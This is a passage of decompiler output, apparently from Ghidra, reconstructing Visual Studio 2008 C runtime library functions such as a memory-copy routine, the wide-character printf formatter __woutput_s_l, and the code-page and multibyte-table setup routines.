            goto switchD_004163bc_caseD_3;
          }
          goto switchD_004163bc_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_004163bc_caseD_2;
          case 3:
            goto switchD_004163bc_caseD_3;
          }
          goto switchD_004163bc_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_004163bc_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_004163bc_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_004163bc_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_004163bc_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_char(wchar_t param_1)

{
  wint_t wVar1;
  FILE *in_EAX;
  int *unaff_ESI;
  
  if (((*(byte *)&in_EAX->_flag & 0x40) == 0) || (in_EAX->_base != (char *)0x0)) {
    wVar1 = __fputwc_nolock(param_1,in_EAX);
    if (wVar1 == 0xffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_multi_char(wchar_t param_1,int param_2)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_1);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2008 Release

void __thiscall _write_string(void *this,int param_1)

{
  int *in_EAX;
  int *piVar1;
  int unaff_EDI;
  
  if (((*(byte *)(unaff_EDI + 0xc) & 0x40) == 0) || (*(int *)(unaff_EDI + 8) != 0)) {
    while (0 < param_1) {
                    // WARNING: Load size is inaccurate
      param_1 = param_1 + -1;
      _write_char(*this);
      this = (void *)((int)this + 2);
      if (*in_EAX == -1) {
        piVar1 = __errno();
        if (*piVar1 != 0x2a) {
          return;
        }
        _write_char(L'?');
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __woutput_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __woutput_s_l(FILE *_File,wchar_t *_Format,_locale_t _Locale,va_list _ArgList)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  int iVar6;
  int extraout_ECX;
  byte *pbVar7;
  int **ppiVar8;
  int *piVar9;
  byte *pbVar10;
  wchar_t *pwVar11;
  bool bVar12;
  longlong lVar13;
  undefined8 uVar14;
  undefined4 uVar15;
  localeinfo_struct *plVar16;
  int *local_470;
  int *local_46c;
  uint local_468;
  wchar_t *local_464;
  undefined4 local_460;
  int *local_45c;
  int local_458;
  int local_454;
  localeinfo_struct local_450;
  int local_448;
  char local_444;
  FILE *local_440;
  char local_43c;
  undefined local_43b;
  uint local_438;
  undefined2 local_434;
  short local_432;
  int *local_430;
  int local_42c;
  int local_428;
  int local_424;
  byte *local_420;
  int **local_41c;
  byte *local_418;
  int *local_414;
  int *local_410;
  uint local_40c;
  int local_408 [127];
  undefined4 local_209;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_440 = _File;
  local_41c = (int **)_ArgList;
  local_458 = 0;
  local_40c = 0;
  local_430 = (int *)0x0;
  local_410 = (int *)0x0;
  local_428 = 0;
  local_454 = 0;
  local_42c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_450,_Locale);
  if (_File == (FILE *)0x0) {
switchD_004168ae_caseD_9:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  else {
    if (_Format != (wchar_t *)0x0) {
      local_420 = (byte *)(uint)(ushort)*_Format;
      local_424 = 0;
      local_418 = (byte *)0x0;
      local_438 = 0;
      local_45c = (int *)0x0;
      if (*_Format != L'\0') {
        do {
          pwVar11 = _Format + 1;
          local_464 = pwVar11;
          if (local_424 < 0) break;
          wVar2 = (wchar_t)local_420;
          if ((ushort)(wVar2 + L'￠') < 0x59) {
            uVar4 = local_420[0x422a58] & 0xf;
          }
          else {
            uVar4 = 0;
          }
          local_438 = (uint)((byte)(&DAT_00422a78)[local_438 + uVar4 * 9] >> 4);
          ppiVar8 = local_41c;
          switch(local_438) {
          case 0:
switchD_004168ae_caseD_0:
            local_42c = 1;
            _write_char(wVar2);
            ppiVar8 = (int **)_ArgList;
            break;
          case 1:
            local_410 = (int *)0xffffffff;
            local_460 = 0;
            local_454 = 0;
            local_430 = (int *)0x0;
            local_428 = 0;
            local_40c = 0;
            local_42c = 0;
            ppiVar8 = (int **)_ArgList;
            break;
          case 2:
            if (local_420 == (byte *)0x20) {
              local_40c = local_40c | 2;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x23) {
              local_40c = local_40c | 0x80;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x2b) {
              local_40c = local_40c | 1;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x2d) {
              local_40c = local_40c | 4;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x30) {
              local_40c = local_40c | 8;
              ppiVar8 = (int **)_ArgList;
            }
            break;
          case 3:
            if (wVar2 == L'*') {
              local_430 = *(int **)_ArgList;
              local_41c = (int **)((int)_ArgList + 4);
              ppiVar8 = local_41c;
              if ((int)local_430 < 0) {
                local_40c = local_40c | 4;
                local_430 = (int *)-(int)local_430;
              }
            }
            else {
              local_430 = (int *)(local_420 + (int)local_430 * 10 + -0x30);
              ppiVar8 = (int **)_ArgList;
            }
            break;
          case 4:
            local_410 = (int *)0x0;
            ppiVar8 = (int **)_ArgList;
            break;
          case 5:
            if (wVar2 == L'*') {
              local_410 = *(int **)_ArgList;
              local_41c = (int **)((int)_ArgList + 4);
              ppiVar8 = local_41c;
              if ((int)local_410 < 0) {
                local_410 = (int *)0xffffffff;
              }
            }
            else {
              local_410 = (int *)(local_420 + (int)local_410 * 10 + -0x30);
              ppiVar8 = (int **)_ArgList;
            }
            break;
          case 6:
            if (local_420 == (byte *)0x49) {
              wVar1 = *pwVar11;
              if ((wVar1 == L'6') && (_Format[2] == L'4')) {
                local_40c = local_40c | 0x8000;
                ppiVar8 = (int **)_ArgList;
                pwVar11 = _Format + 3;
              }
              else if ((wVar1 == L'3') && (_Format[2] == L'2')) {
                local_40c = local_40c & 0xffff7fff;
                ppiVar8 = (int **)_ArgList;
                pwVar11 = _Format + 3;
              }
              else {
                ppiVar8 = (int **)_ArgList;
                if (((((wVar1 != L'd') && (wVar1 != L'i')) && (wVar1 != L'o')) &&
                    ((wVar1 != L'u' && (wVar1 != L'x')))) && (wVar1 != L'X')) {
                  local_438 = 0;
                  goto switchD_004168ae_caseD_0;
                }
              }
            }
            else if (local_420 == (byte *)0x68) {
              local_40c = local_40c | 0x20;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x6c) {
              if (*pwVar11 == L'l') {
                local_40c = local_40c | 0x1000;
                ppiVar8 = (int **)_ArgList;
                pwVar11 = _Format + 2;
              }
              else {
                local_40c = local_40c | 0x10;
                ppiVar8 = (int **)_ArgList;
              }
            }
            else {
              ppiVar8 = (int **)_ArgList;
              if (local_420 == (byte *)0x77) {
                local_40c = local_40c | 0x800;
              }
            }
            break;
          case 7:
            if (local_420 < (byte *)0x65) {
              if (local_420 == (byte *)0x64) {
LAB_00416dae:
                local_40c = local_40c | 0x40;
LAB_00416db5:
                local_420 = (byte *)0xa;
LAB_00416dbf:
                if (((local_40c & 0x8000) == 0) && ((local_40c & 0x1000) == 0)) {
                  local_41c = (int **)((int)_ArgList + 4);
                  if ((local_40c & 0x20) == 0) {
                    piVar3 = *(int **)_ArgList;
                    if ((local_40c & 0x40) == 0) {
                      piVar9 = (int *)0x0;
                    }
                    else {
                      piVar9 = (int *)((int)piVar3 >> 0x1f);
                    }
                  }
                  else {
                    if ((local_40c & 0x40) == 0) {
                      piVar3 = (int *)(uint)*(ushort *)_ArgList;
                    }
                    else {
                      piVar3 = (int *)(int)*(short *)_ArgList;
                    }
                    piVar9 = (int *)((int)piVar3 >> 0x1f);
                  }
                }
                else {
                  local_41c = (int **)((int)_ArgList + 8);
                  piVar3 = *(int **)_ArgList;
                  piVar9 = *(int **)((int)_ArgList + 4);
                }
                if ((((local_40c & 0x40) != 0) && ((int)piVar9 < 1)) && ((int)piVar9 < 0)) {
                  bVar12 = piVar3 != (int *)0x0;
                  piVar3 = (int *)-(int)piVar3;
                  piVar9 = (int *)-(int)((int)piVar9 + (uint)bVar12);
                  local_40c = local_40c | 0x100;
                }
                if ((local_40c & 0x9000) == 0) {
                  piVar9 = (int *)0x0;
                }
                lVar13 = CONCAT44(piVar9,piVar3);
                if ((int)local_410 < 0) {
                  local_410 = (int *)0x1;
                }
                else {
                  local_40c = local_40c & 0xfffffff7;
                  if (0x200 < (int)local_410) {
                    local_410 = (int *)0x200;
                  }
                }
                if (((uint)piVar3 | (uint)piVar9) == 0) {
                  local_428 = 0;
                }
                piVar3 = &local_209;
                while( true ) {
                  piVar9 = (int *)((int)local_410 + -1);
                  if (((int)local_410 < 1) && (lVar13 == 0)) break;
                  local_410 = piVar9;
                  lVar13 = __aulldvrm((uint)lVar13,(uint)((ulonglong)lVar13 >> 0x20),(uint)local_420
                                      ,(int)local_420 >> 0x1f);
                  iVar6 = extraout_ECX + 0x30;
                  if (0x39 < iVar6) {
                    iVar6 = iVar6 + local_458;
                  }
                  *(byte *)piVar3 = (byte)iVar6;
                  piVar3 = (int *)((int)piVar3 + -1);
                }
                local_418 = (byte *)((int)&local_209 + -(int)piVar3);
                local_414 = (int *)((int)piVar3 + 1);
                local_410 = piVar9;
                if (((local_40c & 0x200) != 0) &&
                   ((local_418 == (byte *)0x0 || (*(byte *)local_414 != 0x30)))) {
                  *(byte *)piVar3 = 0x30;
                  local_418 = (byte *)((int)&local_209 + -(int)piVar3 + 1);
                  local_414 = piVar3;
                }
              }
              else if (local_420 < (byte *)0x54) {
                if (local_420 == (byte *)0x53) {
                  if ((local_40c & 0x830) == 0) {
                    local_40c = local_40c | 0x20;
                  }
                  goto LAB_00416b8d;
                }
                if (local_420 != (byte *)0x41) {
                  if (local_420 == (byte *)0x43) {
                    if ((local_40c & 0x830) == 0) {
                      local_40c = local_40c | 0x20;
                    }
LAB_00416c37:
                    wVar2 = *(wchar_t *)_ArgList;
                    local_468 = (uint)(ushort)wVar2;
                    local_41c = (int **)((int)_ArgList + 4);
                    local_42c = 1;
                    if ((local_40c & 0x20) == 0) {
                      local_408[0]._0_2_ = wVar2;
                    }
                    else {
                      local_43c = (char)wVar2;
                      local_43b = 0;
                      iVar6 = __mbtowc_l((wchar_t *)local_408,&local_43c,
                                         (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                      if (iVar6 < 0) {
                        local_454 = 1;
                      }
                    }
                    local_418 = (byte *)0x1;
                    local_414 = local_408;
                    goto LAB_004170fd;
                  }
                  if ((local_420 != (byte *)0x45) && (local_420 != (byte *)0x47)) goto LAB_004170fd;
                }
                local_420 = local_420 + 0x20;
                local_460 = 1;
LAB_00416b24:
                local_40c = local_40c | 0x40;
                local_418 = (byte *)0x200;
                piVar3 = local_408;
                pbVar10 = local_418;
                piVar9 = local_408;
                if ((int)local_410 < 0) {
                  local_410 = (int *)0x6;
                }
                else if (local_410 == (int *)0x0) {
                  if ((short)local_420 == 0x67) {
                    local_410 = (int *)0x1;
                  }
                }
                else {
                  if (0x200 < (int)local_410) {
                    local_410 = (int *)0x200;
                  }
                  if (0xa3 < (int)local_410) {
                    pbVar10 = (byte *)((int)local_410 + 0x15d);
                    local_414 = local_408;
                    local_45c = (int *)__malloc_crt((size_t)pbVar10);
                    piVar3 = local_45c;
                    piVar9 = local_45c;
                    if (local_45c == (int *)0x0) {
                      local_410 = (int *)0xa3;
                      piVar3 = local_408;
                      pbVar10 = local_418;
                      piVar9 = local_414;
                    }
                  }
                }
                local_414 = piVar9;
                local_418 = pbVar10;
                local_470 = *(int **)_ArgList;
                local_41c = (int **)((int)_ArgList + 8);
                local_46c = *(int **)((int)_ArgList + 4);
                plVar16 = &local_450;
                uVar14 = CONCAT44(local_410,(int)(char)local_420);
                ppiVar8 = &local_470;
                piVar9 = piVar3;
                pbVar10 = local_418;
                uVar15 = local_460;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_0042adf8);
                (*pcVar5)(ppiVar8,piVar9,pbVar10,uVar14,uVar15,plVar16);
                uVar4 = local_40c & 0x80;
                if ((uVar4 != 0) && (local_410 == (int *)0x0)) {
                  plVar16 = &local_450;
                  piVar9 = piVar3;
                  pcVar5 = (code *)__decode_pointer((int)PTR_LAB_0042ae04);
                  (*pcVar5)(piVar9,plVar16);
                }
                if (((short)local_420 == 0x67) && (uVar4 == 0)) {
                  plVar16 = &local_450;
                  piVar9 = piVar3;
                  pcVar5 = (code *)__decode_pointer((int)PTR_LAB_0042ae00);
                  (*pcVar5)(piVar9,plVar16);
                }
                if (*(byte *)piVar3 == 0x2d) {
                  local_40c = local_40c | 0x100;
                  piVar3 = (int *)((int)piVar3 + 1);
                  local_414 = piVar3;
                }
LAB_00416d10:
                local_418 = (byte *)_strlen((char *)piVar3);
              }
              else {
                if (local_420 == (byte *)0x58) goto LAB_00416f0e;
                if (local_420 == (byte *)0x5a) {
                  piVar3 = *(int **)_ArgList;
                  local_41c = (int **)((int)_ArgList + 4);
                  if ((piVar3 == (int *)0x0) ||
                     (local_414 = (int *)piVar3[1], local_414 == (int *)0x0)) {
                    local_414 = (int *)PTR_DAT_0042adb0;
                    piVar3 = (int *)PTR_DAT_0042adb0;
                    goto LAB_00416d10;
                  }
                  local_418 = (byte *)(int)(short)*(ushort *)piVar3;
                  if ((local_40c & 0x800) != 0) {
                    iVar6 = (int)local_418 - ((int)local_418 >> 0x1f);
                    goto LAB_004170f5;
                  }
                  local_42c = 0;
                }
                else {
                  if (local_420 == (byte *)0x61) goto LAB_00416b24;
                  if (local_420 == (byte *)0x63) goto LAB_00416c37;
                }
              }
LAB_004170fd:
              pbVar10 = local_418;
              if (local_454 == 0) {
                if ((local_40c & 0x40) != 0) {
                  if ((local_40c & 0x100) == 0) {
                    if ((local_40c & 1) == 0) {
                      if ((local_40c & 2) == 0) goto LAB_0041713f;
                      local_434 = 0x20;
                    }
                    else {
                      local_434 = 0x2b;
                    }
                  }
                  else {
                    local_434 = 0x2d;
                  }
                  local_428 = 1;
                }
LAB_0041713f:
                pbVar7 = (byte *)((int)local_430 + (-local_428 - (int)local_418));
                if ((local_40c & 0xc) == 0) {
                  _write_multi_char(L' ',(int)pbVar7);
                }
                _write_string(&local_434,local_428);
                if (((local_40c & 8) != 0) && ((local_40c & 4) == 0)) {
                  _write_multi_char(L'0',(int)pbVar7);
                }
                if ((local_42c == 0) && (0 < (int)pbVar10)) {
                  local_420 = pbVar10;
                  piVar3 = local_414;
                  do {
                    local_420 = local_420 + -1;
                    iVar6 = __mbtowc_l((wchar_t *)&local_468,(char *)piVar3,
                                       (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                    if (iVar6 < 1) {
                      local_424 = -1;
                      break;
                    }
                    _write_char((wchar_t)local_468);
                    piVar3 = (int *)((int)piVar3 + iVar6);
                  } while (0 < (int)local_420);
                }
                else {
                  _write_string(local_414,(int)pbVar10);
                }
                if ((-1 < local_424) && ((local_40c & 4) != 0)) {
                  _write_multi_char(L' ',(int)pbVar7);
                }
              }
            }
            else {
              if ((byte *)0x70 < local_420) {
                if (local_420 == (byte *)0x73) {
LAB_00416b8d:
                  piVar3 = local_410;
                  if (local_410 == (int *)0xffffffff) {
                    piVar3 = (int *)0x7fffffff;
                  }
                  local_41c = (int **)((int)_ArgList + 4);
                  local_414 = *(int **)_ArgList;
                  if ((local_40c & 0x20) == 0) {
                    piVar9 = local_414;
                    if (local_414 == (int *)0x0) {
                      local_414 = (int *)PTR_u__null__0042adb4;
                      piVar9 = (int *)PTR_u__null__0042adb4;
                    }
                    for (; (piVar3 != (int *)0x0 &&
                           (piVar3 = (int *)((int)piVar3 + -1), *(ushort *)piVar9 != 0));
                        piVar9 = (int *)((int)piVar9 + 2)) {
                    }
                    iVar6 = (int)piVar9 - (int)local_414;
LAB_004170f5:
                    local_41c = (int **)((int)_ArgList + 4);
                    local_42c = 1;
                    local_418 = (byte *)(iVar6 >> 1);
                  }
                  else {
                    if (local_414 == (int *)0x0) {
                      local_414 = (int *)PTR_DAT_0042adb0;
                    }
                    local_418 = (byte *)0x0;
                    piVar9 = local_414;
                    if (0 < (int)piVar3) {
                      do {
                        if (*(byte *)piVar9 == 0) break;
                        iVar6 = __isleadbyte_l((uint)*(byte *)piVar9,&local_450);
                        if (iVar6 != 0) {
                          piVar9 = (int *)((int)piVar9 + 1);
                        }
                        piVar9 = (int *)((int)piVar9 + 1);
                        local_418 = local_418 + 1;
                      } while ((int)local_418 < (int)piVar3);
                    }
                  }
                  goto LAB_004170fd;
                }
                if (local_420 == (byte *)0x75) goto LAB_00416db5;
                if (local_420 != (byte *)0x78) goto LAB_004170fd;
                local_458 = 0x27;
LAB_00416f3e:
                local_420 = (byte *)0x10;
                if ((local_40c & 0x80) != 0) {
                  local_434 = 0x30;
                  local_432 = (short)local_458 + 0x51;
                  local_428 = 2;
                }
                goto LAB_00416dbf;
              }
              if (local_420 == (byte *)0x70) {
                local_410 = (int *)0x8;
LAB_00416f0e:
                local_458 = 7;
                goto LAB_00416f3e;
              }
              if (local_420 < (byte *)0x65) goto LAB_004170fd;
              if (local_420 < (byte *)0x68) goto LAB_00416b24;
              if (local_420 == (byte *)0x69) goto LAB_00416dae;
              if (local_420 != (byte *)0x6e) {
                if (local_420 != (byte *)0x6f) goto LAB_004170fd;
                local_420 = (byte *)0x8;
                if ((local_40c & 0x80) != 0) {
                  local_40c = local_40c | 0x200;
                }
                goto LAB_00416dbf;
              }
              piVar3 = *(int **)_ArgList;
              local_41c = (int **)((int)_ArgList + 4);
              iVar6 = __get_printf_count_output();
              if (iVar6 == 0) goto switchD_004168ae_caseD_9;
              if ((local_40c & 0x20) == 0) {
                *piVar3 = local_424;
              }
              else {
                *(ushort *)piVar3 = (ushort)local_424;
              }
              local_454 = 1;
            }
            ppiVar8 = local_41c;
            pwVar11 = local_464;
            if (local_45c != (int *)0x0) {
              _free(local_45c);
              local_45c = (int *)0x0;
              ppiVar8 = local_41c;
              pwVar11 = local_464;
            }
            break;
          default:
            goto switchD_004168ae_caseD_9;
          case 0xbad1abe1:
            break;
          }
          local_420 = (byte *)(uint)(ushort)*pwVar11;
          _ArgList = (va_list)ppiVar8;
          _Format = pwVar11;
        } while (*pwVar11 != L'\0');
        if ((local_438 != 0) && (local_438 != 7)) goto LAB_00416813;
      }
      if (local_444 != '\0') {
        *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
      }
      goto LAB_004172dc;
    }
LAB_00416813:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_444 != '\0') {
    *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
  }
LAB_004172dc:
  iVar6 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar6;
}



// Library Function - Single Match
//  int __cdecl CPtoLCID(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  _memset((void *)(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_0042a790 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_0042a790 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
  uint uVar4;
  CHAR CVar5;
  char cVar6;
  BYTE *pBVar7;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [256];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_00417519:
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_00417519;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pBVar7 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar7) {
          _memset(local_108 + uVar4,0x20,(*pBVar7 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar7[1];
        pBVar7 = pBVar7 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          CVar5 = local_308[uVar4];
          goto LAB_004174b7;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        CVar5 = local_208[uVar4];
LAB_004174b7:
        *(CHAR *)(unaff_ESI + 0x11d + uVar4) = CVar5;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2008 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_0042acb4) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)PTR_DAT_0042abb8) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_0042a790)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_0042abb8;
      lpAddend = (pthreadmbcinfo)PTR_DAT_0042abb8;
      InterlockedIncrement((LONG *)PTR_DAT_0042abb8);
    }
    FUN_004175ce();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_004175ce(void)

{
  FUN_00413064(0xd);
  return;
}



// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  int unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_0042c1cc = 0;
  if (unaff_ESI == -2) {
    DAT_0042c1cc = 1;
    UVar1 = GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_0042c1cc = 1;
    UVar1 = GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_0042c1cc = 0;
        return unaff_ESI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_ESI;
    }
    UVar1 = *(UINT *)(local_14[0] + 4);
    DAT_0042c1cc = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2008 Release

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  BOOL BVar6;
  undefined2 *puVar7;
  byte *pbVar8;
  int extraout_ECX;
  undefined2 *puVar9;
  int iVar10;
  undefined4 extraout_EDX;
  BYTE *pBVar11;
  threadmbcinfostruct *unaff_EDI;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
